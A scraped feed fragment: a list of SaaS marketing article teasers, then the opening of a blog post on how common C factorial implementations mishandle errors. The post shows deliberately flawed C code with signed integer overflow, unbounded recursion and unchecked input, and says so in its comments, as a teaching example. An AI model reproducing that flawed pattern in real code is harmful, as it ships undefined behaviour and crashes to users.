					<p><a href="https://terrygodier.com/patterns/meta-content/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/12/meta-content-768x403-1-150x79.png" alt="meta content 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/12/meta-content-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/12/meta-content-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/12/meta-content-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="Build Hype by Creating Meta Content 4" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/12/meta-content-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/12/meta-content-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/12/meta-content-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/12/meta-content-768x403-1-150x79.png"></a>
					</p>
					<div>
					<h2><a href="https://terrygodier.com/patterns/meta-content/">Build Hype by Creating Meta Content</a></h2>
						<p>Meta content can build hype for upcoming releases, underscore quality claims, and provide a narrative to products and brands. </p>						<p><time datetime="2020-12-04T11:45:53+00:00">12/4/2020 11:45am</time></p>
					</div>
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/repurpose-and-recycle/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/11/recycle-repurpose-768x403-1-150x79.png" alt="recycle repurpose 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/11/recycle-repurpose-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/11/recycle-repurpose-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/11/recycle-repurpose-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="Repurpose and Recycle Content for Social Media 5" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/11/recycle-repurpose-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/11/recycle-repurpose-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/11/recycle-repurpose-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/11/recycle-repurpose-768x403-1-150x79.png"></a>
					</p>
					<div>
					<h2><a href="https://terrygodier.com/patterns/repurpose-and-recycle/">Repurpose and Recycle Content for Social Media</a></h2>
						<p>Get better at promoting existing assets instead of becoming addicted to creating new ones. Repurposing creates many small assets from a larger piece, and recycling creates something new from many existing assets.</p>						<p><time datetime="2020-11-20T11:28:58+00:00">11/20/2020 11:28am</time></p>
					</div>
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/swag-giveaways/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/11/swag-768x403-1-150x79.png" alt="swag 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/11/swag-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/11/swag-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/11/swag-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="How to Do Swag Giveaways to Grow Your Business 6" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/11/swag-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/11/swag-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/11/swag-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/11/swag-768x403-1-150x79.png"></a>
					</p>
					
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/social-listening/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/11/social-listening-768x403-1-150x79.png" alt="social listening 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/11/social-listening-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/11/social-listening-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/11/social-listening-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="Monitor Your Social Media Mentions with Social Listening 7" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/11/social-listening-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/11/social-listening-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/11/social-listening-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/11/social-listening-768x403-1-150x79.png"></a>
					</p>
					
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/buy-data-from-google/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/10/buy-data-768x403-1-150x79.png" alt="buy data 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/10/buy-data-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/buy-data-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/buy-data-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="How to Use Google Ads to Buy Data from Google 8" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/10/buy-data-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/buy-data-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/buy-data-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/10/buy-data-768x403-1-150x79.png"></a>
					</p>
					
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/build-a-qa-library/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/10/qa_library-768x403-1-150x79.png" alt="qa library 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/10/qa_library-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/qa_library-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/qa_library-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="How to Build a Q&amp;A Library for SEO Growth 9" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/10/qa_library-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/qa_library-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/qa_library-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/10/qa_library-768x403-1-150x79.png"></a>
					</p>
					<div>
					<h2><a href="https://terrygodier.com/patterns/build-a-qa-library/">How to Build a Q&amp;A Library for SEO Growth</a></h2>
						<p>Answering questions for your target audience builds credibility. Q&amp;A content has several viable distribution channels, which can help drive traffic and sales.</p>						<p><time datetime="2020-10-23T11:43:34+00:00">10/23/2020 11:43am</time></p>
					</div>
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/give-a-lifetime-deal/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/10/lifetime-deals-768x403-1-150x79.png" alt="lifetime deals 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/10/lifetime-deals-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/lifetime-deals-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/lifetime-deals-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="How to do a Lifetime Deal on Your Product 10" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/10/lifetime-deals-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/lifetime-deals-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/lifetime-deals-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/10/lifetime-deals-768x403-1-150x79.png"></a>
					</p>
					<div>
					<h2><a href="https://terrygodier.com/patterns/give-a-lifetime-deal/">How to do a Lifetime Deal on Your Product</a></h2>
						<p>Running a large discount or lifetime deal allows you to drive significant amounts of users (and revenue), which can later be upsold for revenue expansion or leveraged for network effects.</p>						<p><time datetime="2020-10-21T14:39:15+00:00">10/21/2020 2:39pm</time></p>
					</div>
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/real-money-referral-programs/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/10/referral-768x403-1-150x79.png" alt="referral 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/10/referral-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/referral-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/referral-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="Real Money Referral Program Best Practices 11" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/10/referral-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/referral-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/referral-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/10/referral-768x403-1-150x79.png"></a>
					</p>
					
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/send-a-monthly-newsletter/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/10/newsletter-768x403-1-150x79.png" alt="newsletter 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/10/newsletter-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/newsletter-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/newsletter-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="How to Build a Monthly Newsletter That Converts 12" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/10/newsletter-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/newsletter-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/newsletter-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/10/newsletter-768x403-1-150x79.png"></a>
					</p>
					
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/integrate-into-an-ecosystem/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/10/integrate-768x403-1-150x79.png" alt="integrate 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/10/integrate-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/integrate-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/integrate-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="API Marketing: How to Integrate Into an Ecosystem 13" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/10/integrate-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/integrate-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/integrate-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/10/integrate-768x403-1-150x79.png"></a>
					</p>
					
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/become-a-perk/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/10/perks-768x403-1-150x79.png" alt="perks 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/10/perks-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/perks-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/perks-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="How to Get Your Product Listed as a Perk 14" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/10/perks-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/perks-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/perks-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/10/perks-768x403-1-150x79.png"></a>
					</p>
					<div>
					<h2><a href="https://terrygodier.com/patterns/become-a-perk/">How to Get Your Product Listed as a Perk</a></h2>
						<p>Many training programs and communities offer membership perks, which include discounts and trials of tools and services. Become one and get users and sales. </p>						<p><time datetime="2020-10-08T14:54:27+00:00">10/8/2020 2:54pm</time></p>
					</div>
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/co-hosting-webinars-for-leads/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/10/co-host-webinar-768x403-1-150x79.png" alt="co host webinar 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/10/co-host-webinar-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/co-host-webinar-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/co-host-webinar-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="SaaS Lead Gen: How to Co-host a Webinar 15" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/10/co-host-webinar-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/co-host-webinar-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/co-host-webinar-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/10/co-host-webinar-768x403-1-150x79.png"></a>
					</p>
					
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/technology-profiling-for-prospects/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/10/profiling-768x403-1-150x79.png" alt="profiling 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/10/profiling-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/profiling-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/profiling-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="SaaS Marketing with BuiltWith: Technology Profiling for Prospects 16" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/10/profiling-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/profiling-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/profiling-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/10/profiling-768x403-1-150x79.png"></a>
					</p>
					
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/inclusion-on-best-lists/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/10/best-lists-768x403-1-150x79.png" alt="best lists 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/10/best-lists-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/best-lists-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/best-lists-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="Get Your Product Included on &quot;Best&quot; Lists 17" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/10/best-lists-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/best-lists-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/best-lists-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/10/best-lists-768x403-1-150x79.png"></a>
					</p>
					
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/rlsas-for-broad-keywords/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/09/rlsa_broad-768x403-1-150x79.png" alt="rlsa broad 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/09/rlsa_broad-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/09/rlsa_broad-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/09/rlsa_broad-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="How to Run RLSAs and Target Broad Queries 18" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/09/rlsa_broad-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/09/rlsa_broad-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/09/rlsa_broad-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/09/rlsa_broad-768x403-1-150x79.png"></a>
					</p>
					<div>
					<h2><a href="https://terrygodier.com/patterns/rlsas-for-broad-keywords/">How to Run RLSAs and Target Broad Queries</a></h2>
						<p>RLSAs allow you to bid on broad keywords but only for a specific audience that’s already familiar with your brand, therefore increasing the likelihood of a conversion outcome. </p>						<p><time datetime="2020-09-24T17:00:26+00:00">09/24/2020 5:00pm</time></p>
					</div>
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/competitor-comparison-content/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/09/comparison-768x403-1-150x79.png" alt="comparison 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/09/comparison-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/09/comparison-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/09/comparison-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="Beat Your Competitors With Comparison Content 19" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/09/comparison-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/09/comparison-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/09/comparison-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/09/comparison-768x403-1-150x79.png"></a>
					</p>
					<div>
					<h2><a href="https://terrygodier.com/patterns/competitor-comparison-content/">Beat Your Competitors With Comparison Content</a></h2>
						<p>Prospective customers often compare products before they make a purchase. Use this pattern to get in front of them during this crucial phase and remind them why your product is superior. </p>						<p><time datetime="2020-09-23T15:33:47+00:00">09/23/2020 3:33pm</time></p>
					</div>
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/competitor-cancel-jacking/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/09/cancel-jacking-768x403-1-150x79.png" alt="cancel jacking 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/09/cancel-jacking-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/09/cancel-jacking-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/09/cancel-jacking-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="Steal Competitors Customers With Cancel Jacking 20" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/09/cancel-jacking-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/09/cancel-jacking-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/09/cancel-jacking-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/09/cancel-jacking-768x403-1-150x79.png"></a>
					</p>
					
				</div>
								

			</section>
		</div></div>]]>
            </description>
            <link>https://terrygodier.com/patterns/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26116276</guid>
            <pubDate>Fri, 12 Feb 2021 17:42:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Writing a Factorial Function in C]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26116202">thread link</a>) | @hdante
<br/>
February 12, 2021 | https://not.cafe/2021/02/08/writing-a-factorial-function-in-c.html | <a href="https://web.archive.org/web/*/https://not.cafe/2021/02/08/writing-a-factorial-function-in-c.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div>
      <article>
    

  <h5>Posted at <time>2021-02-08 21:37+0000</time>
  
  </h5>

  
  

  <p><strong>TLDR:</strong> The most common implementations of the factorial function in C do not handle
errors correctly and have typical code vulnerabilities. The factorial function should
include error handling even when only for the goal of teaching recursion, so that
beginners get used to writing robust code.</p>

<p><strong>Note:</strong> If you need a real factorial function, or its logarithm to do number theoretical
calculations, it’s available in the C standard library as <code>tgammal()</code> and <code>lgammal()</code>
functions <a href="#ref-glibc-math">[1]</a><a href="#ref-posix-tgammal">[2]</a><a href="#ref-posix-lgammal">[3]</a>.</p>

<figure>
  <a href="https://commons.wikimedia.org/wiki/File:Cliche_Hacker_and_Binary_Code_(26614834084).jpg" target="_blank">
    <img src="https://upload.wikimedia.org/wikipedia/commons/9/9f/Cliche_Hacker_and_Binary_Code_%2826614834084%29.jpg" alt="Hooded hacker at keyboard with binary code in front">
  </a>
  <figcaption>
    According to the
    <a href="https://cwe.mitre.org/top25/archive/2020/2020_cwe_top25.html" target="_blank">
    2020 Common Weakness Enumeration (CWE™) Top 25 Most Dangerous Software Weakness
    list</a>, buffer attacks are the second (out-of-bounds write) and fourth
    (out-of-bounds read) most dangerous software weaknesses. Improper input validation
    is third and integer overflow is eleventh.
  </figcaption>
</figure>

<p><span>!☕</span> The C language was created shortly after the Unix
operating system in the 1970’s, so that the new operating system could be written in a
simple and efficient programming language, instead of
assembly <a href="#ref-chistory">[4]</a>. Portability soon became a motivation too: to be able
to run Unix and applications in heterogeneous systems caused the operating system and the
C programming language to have a profound and long lasting impact on computer
systems <a href="#ref-tiobe-index">[5]</a><a href="#ref-stackoverflow">[6]</a><a href="#ref-ctoday">[7]</a><a href="#ref-unixhistory">[8]</a><a href="#ref-unixtoday">[9]</a>.
Simplicity, efficiency and portability, built into the language and transformed into
programming philosophy, came with a price. When programming in C, if you want it, you’ll
have it. That includes writing broken code, invoking behavior not defined by the language
and, in general, allowing you, without questioning, to “shoot your own foot”. Those who do
not program in C might believe this wouldn’t affect them. Remember, though, that many
modern languages were influenced and even replicated C syntax and
behavior <a href="#ref-cfamily">[10]</a>. Even for languages that were not directly influenced
by C, simplicity and efficiency requirements may still cause a lot of
<a href="https://en.wikipedia.org/wiki/Principle_of_least_astonishment" target="_blank">astonishment</a>.</p>

<p>In this post, we’ll begin by writing a couple of factorial function implementations in C
that 9 out of the first 10 Google Search results implement. Then, we’ll discuss the
problems, present a minimal robust implementation and finally discuss about different ways
of doing error handling in C, so that, in the end you feel motivated to always write
robust code.</p>

<h3 id="recursive-factorial">Recursive factorial</h3>

<p>So here we go, this is the “Google version” of the recursive factorial function written in
C:</p>

<div><div><pre><code><span>#include &lt;stdio.h&gt;
</span>
<span>int</span> <span>factorial</span><span>(</span><span>int</span> <span>n</span><span>)</span>
<span>{</span>
	<span>/* This basic recursive factorial function is widespread
	 * on the Internet, but results in incorrect results most
	 * of the time, contains a stack overflow and integer
	 * underflow. */</span>
	<span>if</span> <span>(</span><span>n</span> <span>==</span> <span>0</span><span>)</span> <span>return</span> <span>1</span><span>;</span>

	<span>return</span> <span>n</span><span>*</span><span>factorial</span><span>(</span><span>n</span><span>-</span><span>1</span><span>);</span>
<span>}</span>

<span>int</span> <span>main</span><span>(</span><span>void</span><span>)</span>
<span>{</span>
	<span>int</span> <span>x</span><span>;</span>

	<span>/* Missing error checking on standard I/O. */</span>
	<span>printf</span><span>(</span><span>"Input a number: "</span><span>);</span>
	<span>scanf</span><span>(</span><span>"%d"</span><span>,</span> <span>&amp;</span><span>x</span><span>);</span>
	<span>printf</span><span>(</span><span>"The factorial of %d is: %d</span><span>\n</span><span>"</span><span>,</span> <span>x</span><span>,</span> <span>factorial</span><span>(</span><span>x</span><span>));</span>

	<span>return</span> <span>0</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Let’s compile and run this program:</p>

<pre><code>$ cc -o fact0 fact0.c
$ ./fact0
Input a number: 100
The factorial of 100 is: 0
$
</code></pre>

<p>So the factorial of 100 is 0. Or is it ? Factorials are positive integers. Have we
written anything wrong ? A quick search online shows that there are indeed
implementations exactly like this and that the mathematical recursive formula for the
factorial is correct. Also, for some numbers the program correctly calculates the result:</p>

<pre><code>$ ./fact0
Input a number: 5
The factorial of 5 is: 120
$ ./fact0
Input a number: 12
The factorial of 12 is: 479001600
$
</code></pre>

<h3 id="interlude-factorial-in-python">Interlude: factorial in Python</h3>

<p>Let’s put this code on hold for a moment and implement exactly the same algorithm in
Python:</p>

<div><div><pre><code><span>#!/usr/bin/env python3
</span><span>def</span> <span>factorial</span><span>(</span><span>n</span><span>):</span>
    <span># Incomplete factorial implementation, but better than C
</span>    <span># (all behavior is defined by the language).
</span>    <span>if</span> <span>n</span> <span>==</span> <span>0</span><span>:</span> <span>return</span> <span>1</span>

    <span>return</span> <span>n</span><span>*</span><span>factorial</span><span>(</span><span>n</span><span>-</span><span>1</span><span>)</span>

<span>def</span> <span>main</span><span>():</span>
    <span>x</span> <span>=</span> <span>int</span><span>(</span><span>input</span><span>(</span><span>'Input a number: '</span><span>))</span>
    <span>print</span><span>(</span><span>'The factorial of %d is: %d'</span> <span>%</span> <span>(</span><span>x</span><span>,</span> <span>factorial</span><span>(</span><span>x</span><span>)))</span>

<span>if</span> <span>__name__</span> <span>==</span> <span>'__main__'</span><span>:</span> <span>main</span><span>()</span>
</code></pre></div></div>

<p>Running this program outputs:</p>

<pre><code>$ ./fact.py
Input a number: 100
The factorial of 100 is: 93326215443944152681699238856266700490715968264381621468592963895217599993229915608941463976156518286253697920827223758251185210916864000000000000000000000000
$ ./fact.py
Input a number: 5
The factorial of 5 is: 120
$ ./fact.py
Input a number: 12
The factorial of 12 is: 479001600
$
</code></pre>

<p>Ok, now it makes sense. The Python programming language, using arbitrary precision integer
numbers is able to correctly calculate the factorial using the recursive formula. In the
case of C, the integer data type (<code>int</code>) is a fixed width binary integer number (on my
computer, a 32-bit integer), without a defined overflow behavior. I can confirm this is
causing problems by using the undefined behavior detector library from my C compiler:</p>

<pre><code>$ cc -o fact0 fact0.c -fsanitize=undefined
$ ./fact0
Input a number: 100
fact0.c:10:10: runtime error: signed integer overflow: 13 * 479001600 cannot be represented in type 'int'
The factorial of 100 is: 0
$
</code></pre>

<p>So, that’s it, we’ve found it. Not only integer overflow is happening, we’ve confirmed by
using the undefined behavior detector that signed integer overflow in C is undefined
behavior. Due to the motivation of being small, efficient and portable to write an
operating system 50 years ago, the language rules won’t bother considering this case: what
happens when an integer operation overflows ? The language states that it’s
undefined. Anything is allowed to happen (like crashing the program or exploding a
spaceship). The reason for this is that this might be used for some kind of benefit,
typically related to performance and compiler simplicity, for a certain type of computer.
For example, for my compiler with default flags, integer overflows simply wrap around to
the minimum possible value because, when compiled, it results in the fastest possible
integer arithmetic code for my machine, and could be used for modular value calculations,
if desired. Other computers are free to implement a different behavior, also striving for
the fastest performance, if desired. This means that undefined behavior in C is part of
the language specification that helps guaranteeing that the language will be both portable
and performant in heterogeneous systems. Undefined behavior is arguably one of the reasons
C is so widespread for writing high performance system software. Consider, for example,
the modern high performance language <a href="https://www.rust-lang.org/" target="_blank">Rust</a>,
praised for its modern safety features <a href="#ref-rustsafety">[11]</a>, and, in my opinion,
one of the best contenders for replacing C++ in the near future, also
<a href="https://doc.rust-lang.org/book/ch03-02-data-types.html?highlight=overflow#integer-overflow" target="_blank">opting to allow silent integer overflows, yet stating that relying on it is considered an error</a>.
More commonly nowadays, however, since computers are becoming more homogeneous, the
unexpected result will simply cause a bug, without offering any other portability benefit.
Worse yet, in our specific case, compiling with default flags mentioned nothing. The
programmer was allowed to do that and the C compiler was silent about that.</p>

<h3 id="as-buggy-as-possible">As buggy as possible</h3>

<p>In the latest international C draft standard (ISO C 2017/2018 <a href="#ref-isoc17">[12]</a>),
